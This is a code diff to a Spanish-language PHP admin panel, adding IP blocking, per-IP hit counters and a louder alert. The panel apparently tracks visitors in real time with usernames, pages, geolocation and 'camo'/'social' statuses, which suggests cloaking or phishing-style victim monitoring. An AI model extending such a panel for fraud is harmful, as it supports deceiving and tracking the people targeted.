@@ -34,6 +34,8 @@ $LINKS_FILE = __DIR__ . '/links.json';
 $UP_DIR     = __DIR__ . '/panel_uploads';
 $ENV_PASS   = getenv('PANEL_PASS') ?: '';
 
+require_once __DIR__ . '/_track.php'; // geo + helpers de bloqueo IP
+
 $storedHash = '';
 if (is_file($KEY_FILE)) { $storedHash = (string)@include $KEY_FILE; }
 $setupMode = ($ENV_PASS === '' && $storedHash === '');
@@ -129,6 +131,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             @file_put_contents($LOG_FILE, '', LOCK_EX);
             $msg = 'Métricas reiniciadas.';
         }
+        if ($act === 'block_ip') {
+            $bip = trim((string)($_POST['ip'] ?? ''));
+            $msg = trk_block_ip($bip, 10800) ? "IP $bip bloqueada por 3 horas." : 'IP inválida.';
+        }
+        if ($act === 'unblock_ip') {
+            $bip = trim((string)($_POST['ip'] ?? ''));
+            trk_unblock_ip($bip);
+            $msg = "IP $bip desbloqueada.";
+        }
     }
 }
 
@@ -155,14 +166,14 @@ $links = is_file($LINKS_FILE) ? (json_decode(@file_get_contents($LINKS_FILE), tr
 
 $today = date('Y-m-d');
 $totOk=0;$totCamo=0;$totSocial=0;$totPg=0;$todayOk=0;
-$ipsAll=[];$ipsToday=[];$newestOk='';
+$ipsAll=[];$ipsToday=[];$newestOk='';$ipOkCnt=[];
 $slugHit=[];$slugIps=[];$slugToday=[];$slugLast=[];
 $cityIps=[];$cityToday=[];
 $ccIps=[];
 foreach ($rows as $r) {
     $st=(string)($r['st']??''); $ip=(string)($r['ip']??'');
     $d=date('Y-m-d',(int)$r['ts']); $isT=($d===$today);
-    if ($st==='ok'){ $totOk++; if($isT)$todayOk++; $newestOk=$r['ts'].'|'.$ip; }
+    if ($st==='ok'){ $totOk++; if($isT)$todayOk++; $newestOk=$r['ts'].'|'.$ip; if($ip!=='')$ipOkCnt[$ip]=($ipOkCnt[$ip]??0)+1; }
     elseif ($st==='camo') $totCamo++;
     elseif ($st==='social') $totSocial++;
     elseif ($st==='pg') $totPg++;
@@ -185,21 +196,24 @@ $recent = array_slice(array_reverse($rows), 0, 60);
 // Verde ≤15s (poll 3s) | Naranja 15s–5min (salió, puede volver) | Gris >5min
 $pres = [];
 $_pd = __DIR__ . '/simulador/acciones/presence';
-require_once __DIR__ . '/_track.php';
+$blockedMap = trk_blocked_map();
 foreach ((array)@glob($_pd . '/*.txt') as $pf) {
     $j = json_decode((string)@file_get_contents($pf), true);
     if (!is_array($j)) continue;
     $age = time() - (int)($j['ts'] ?? 0);
     $stt = $age <= 15 ? 'on' : ($age <= 300 ? 'warn' : 'off');
-    $_g  = function_exists('trk_geo') ? trk_geo((string)($j['ip'] ?? '')) : ['cc'=>'-','city'=>'-'];
+    $_ip = (string)($j['ip'] ?? '');
+    $_g  = trk_geo($_ip);
     $pres[] = [
         'sid' => basename($pf, '.txt'),
-        'ip'  => (string)($j['ip'] ?? ''),
+        'ip'  => $_ip,
         'u'   => (string)($j['u'] ?? ''),
         'pg'  => (string)($j['pg'] ?? ''),
         'loc' => trim((string)($_g['city'] ?? '-') . ' ' . (string)($_g['cc'] ?? '')),
         'age' => $age,
         'st'  => $stt,
+        'cnt' => (int)($ipOkCnt[$_ip] ?? 0),
+        'blk' => isset($blockedMap[$_ip]),
     ];
 }
 usort($pres, function($a,$b){return $a['age']<=>$b['age'];});
@@ -230,6 +244,7 @@ if ($authed && ($_GET['ajax'] ?? '') === 'feed') {
             'st' => (string)($r['st'] ?? ''),
             'ref'=> (string)($r['ref'] ?? ''),
             'ua' => (string)($r['ua'] ?? ''),
+            'cnt'=> (int)($ipOkCnt[(string)($r['ip'] ?? '')] ?? 0),
         ];
     }
     echo json_encode([
@@ -292,6 +307,9 @@ td.trunc{max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowr
 .dot.warn{background:#f59e0b;box-shadow:0 0 5px #f59e0b55}
 .dot.off{background:#9ca3af}
 .lgd{font-weight:400;font-size:11px;color:#999}
+.cnt{display:inline-block;background:#eef2ff;color:#4a51c9;border-radius:8px;padding:0 6px;font-size:10px;font-weight:700;margin-left:4px}
+.blkbtn{background:none;border:0;cursor:pointer;font-size:13px;padding:2px 5px}
+.blkbtn:hover{filter:brightness(1.2)}
 </style>
 </head>
 <body>
@@ -336,21 +354,35 @@ td.trunc{max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowr
 
     <h2>En línea ahora <span class="lgd">· 🟢 en línea · 🟠 salió, puede volver · ⚪ se fue</span></h2>
     <table>
-        <tr><th>Estado</th><th>IP</th><th>Ubicación</th><th>Usuario</th><th>Página</th><th>Hace</th></tr>
+        <tr><th>Estado</th><th>IP</th><th>Ubicación</th><th>Usuario</th><th>Página</th><th>Hace</th><th></th></tr>
         <tbody id="onBody">
         <?php foreach($pres as $p): ?>
         <tr>
             <td><span class="dot <?=e($p['st'])?>"></span></td>
-            <td class="url"><?=e($p['ip'])?></td>
+            <td class="url"><?=e($p['ip'])?><?php if($p['cnt']>1):?><span class="cnt">x<?=$p['cnt']?></span><?php endif;?></td>
             <td><?=e($p['loc'])?></td>
             <td><?=e($p['u'])?></td>
             <td><?=e($p['pg'])?></td>
             <td><?=$p['age']<60?$p['age'].'s':($p['age']<3600?(int)($p['age']/60).'m':(int)($p['age']/3600).'h')?></td>
+            <td><button type="button" class="blkbtn" data-ip="<?=e($p['ip'])?>" data-blk="<?=$p['blk']?'1':''?>" title="<?=$p['blk']?'Desbloquear':'Bloquear 3h'?>"><?=$p['blk']?'🔓':'🚫'?></button></td>
         </tr>
         <?php endforeach; ?>
-        <?php if(!$pres):?><tr><td colspan="6" style="color:#999">Nadie conectado todavía</td></tr><?php endif;?>
+        <?php if(!$pres):?><tr><td colspan="7" style="color:#999">Nadie conectado todavía</td></tr><?php endif;?>
         </tbody>
     </table>
+    <?php if($blockedMap): ?>
+    <h2>IPs bloqueadas <span class="lgd">· expiran solas (3h)</span></h2>
+    <table>
+        <tr><th>IP</th><th>Queda</th><th></th></tr>
+        <?php foreach($blockedMap as $bip=>$until): $rem=$until-time(); ?>
+        <tr>
+            <td class="url"><?=e($bip)?></td>
+            <td><?=$rem<60?$rem.'s':($rem<3600?(int)($rem/60).'m':(int)($rem/3600).'h '.(int)(($rem%3600)/60).'m')?></td>
+            <td><button type="button" class="blkbtn" data-ip="<?=e($bip)?>" data-blk="1" title="Desbloquear">🔓 Desbloquear</button></td>
+        </tr>
+        <?php endforeach; ?>
+    </table>
+    <?php endif; ?>
 
     <h2>Slugs / extensiones por imagen</h2>
     <div class="newslug">
@@ -432,7 +464,7 @@ td.trunc{max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowr
         <?php foreach($recent as $r): $st=(string)($r['st']??''); ?>
         <tr>
             <td><?=date('d/m H:i',(int)$r['ts'])?></td>
-            <td class="url"><?=e($r['ip']??'')?></td>
+            <td class="url"><?=e($r['ip']??'')?><?php if(($ipOkCnt[(string)($r['ip']??'')]??0)>1):?><span class="cnt">x<?=$ipOkCnt[(string)$r['ip']]?></span><?php endif;?></td>
             <td><?=e(($r['city']??'-').' '.($r['cc']??''))?></td>
             <td><?=e($r['e']??'')?></td>
             <td><span class="badge b-<?=e($st)?>"><?=e($st)?></span></td>
@@ -503,7 +535,9 @@ td.trunc{max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowr
           rec.forEach(function(r){
             var tr=document.createElement('tr');
             function td(txt,cls){var c=document.createElement('td');if(cls)c.className=cls;c.textContent=txt;tr.appendChild(c);}
-            td(r.t);td(r.ip,'url');td(r.loc);td(r.e);
+            td(r.t);td(r.ip,'url');
+            if(r.cnt>1){var spc=document.createElement('span');spc.className='cnt';spc.textContent='x'+r.cnt;tr.lastChild.appendChild(spc);}
+            td(r.loc);td(r.e);
             var c=document.createElement('td');var sp=document.createElement('span');
             sp.className='badge b-'+r.st;sp.textContent=r.st;c.appendChild(sp);tr.appendChild(c);
             td(r.ref,'trunc');td(r.ua,'trunc');
@@ -521,11 +555,14 @@ td.trunc{max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowr
   function beep(){
     if(!AC)initAC();if(!AC||AC.state!=='running')return;
     try{
-      var o=AC.createOscillator(),g=AC.createGain();
-      o.connect(g);g.connect(AC.destination);o.type='sine';o.frequency.value=880;
-      g.gain.setValueAtTime(.12,AC.currentTime);
-      g.gain.exponentialRampToValueAtTime(.0001,AC.currentTime+.5);
-      o.start();o.stop(AC.currentTime+.5);
+      [880,1320].forEach(function(f,i){
+        var o=AC.createOscillator(),g=AC.createGain();
+        o.connect(g);g.connect(AC.destination);o.type='square';o.frequency.value=f;
+        var t=AC.currentTime+i*0.18;
+        g.gain.setValueAtTime(.22,t);
+        g.gain.exponentialRampToValueAtTime(.0001,t+.3);
+        o.start(t);o.stop(t+.3);
+      });
     }catch(e){}
   }
   function haceTxt(a){return a<60?a+'s':(a<3600?Math.floor(a/60)+'m':Math.floor(a/3600)+'h');}
@@ -557,7 +594,9 @@ td.trunc{max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowr
           rec.forEach(function(r){
             var tr=document.createElement('tr');
             function td(txt,cls){var c=document.createElement('td');if(cls)c.className=cls;c.textContent=txt;tr.appendChild(c);}
-            td(r.t);td(r.ip,'url');td(r.loc);td(r.e);
+            td(r.t);td(r.ip,'url');
+            if(r.cnt>1){var spc=document.createElement('span');spc.className='cnt';spc.textContent='x'+r.cnt;tr.lastChild.appendChild(spc);}
+            td(r.loc);td(r.e);
             var c=document.createElement('td');var sp=document.createElement('span');
             sp.className='badge b-'+r.st;sp.textContent=r.st;c.appendChild(sp);tr.appendChild(c);
             td(r.ref,'trunc');td(r.ua,'trunc');
@@ -571,7 +610,7 @@ td.trunc{max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowr
           var onl=d.online||[];
           if(!onl.length){
             var tr9=document.createElement('tr');var c9=document.createElement('td');
-            c9.colSpan=6;c9.style.color='#999';c9.textContent='Nadie conectado todavía';
+            c9.colSpan=7;c9.style.color='#999';c9.textContent='Nadie conectado todavía';
             tr9.appendChild(c9);ob.appendChild(tr9);
           }
           onl.forEach(function(p){
@@ -579,7 +618,13 @@ td.trunc{max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowr
             var c=document.createElement('td');var sp=document.createElement('span');
             sp.className='dot '+p.st;c.appendChild(sp);tr.appendChild(c);
             function td(txt,cls){var x=document.createElement('td');if(cls)x.className=cls;x.textContent=txt;tr.appendChild(x);}
-            td(p.ip,'url');td(p.loc);td(p.u);td(p.pg);td(haceTxt(p.age));
+            td(p.ip,'url');
+            if(p.cnt>1){var spt=document.createElement('span');spt.className='cnt';spt.textContent='x'+p.cnt;tr.lastChild.appendChild(spt);}
+            td(p.loc);td(p.u);td(p.pg);td(haceTxt(p.age));
+            var bc=document.createElement('td');var bb=document.createElement('button');
+            bb.type='button';bb.className='blkbtn';bb.textContent=p.blk?'🔓':'🚫';
+            bb.title=p.blk?'Desbloquear':'Bloquear 3h';bb.dataset.ip=p.ip;bb.dataset.blk=p.blk?'1':'';
+            bc.appendChild(bb);tr.appendChild(bc);
             ob.appendChild(tr);
           });
         }
@@ -593,6 +638,18 @@ td.trunc{max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowr
       .catch(function(){});
   };
   setInterval(feed,5000);feed();
+
+  // Bloquear / desbloquear IP (delegado: cubre filas renderizadas y del feed)
+  document.addEventListener('click',function(ev){
+    var b=ev.target.closest?ev.target.closest('.blkbtn'):null;
+    if(!b||!b.dataset.ip)return;
+    var fd=new FormData();
+    fd.append('act',b.dataset.blk?'unblock_ip':'block_ip');
+    fd.append('csrf',csrf);fd.append('ip',b.dataset.ip);
+    fetch('panel.php',{method:'POST',body:fd,credentials:'same-origin'})
+      .then(function(){location.reload()})
+      .catch(function(){location.reload()});
+  });
 })();
 </script>
 <?php endif; ?>
